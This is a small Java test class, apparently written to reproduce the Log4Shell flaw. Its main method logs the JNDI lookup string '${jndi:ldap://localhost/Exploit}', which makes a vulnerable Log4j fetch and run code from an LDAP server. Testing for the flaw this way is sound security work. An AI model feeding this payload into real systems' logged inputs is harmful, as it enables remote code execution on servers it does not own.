package com.gxitsky.proxy.stream;

import lombok.extern.slf4j.Slf4j;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author gxing
 * @desc TODO
 * @date 2021/11/23
 */
@Slf4j
public class MainTest1 {
    public static final Logger logger = LoggerFactory.getLogger(MainTest1.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost/Exploit}");
    }
}
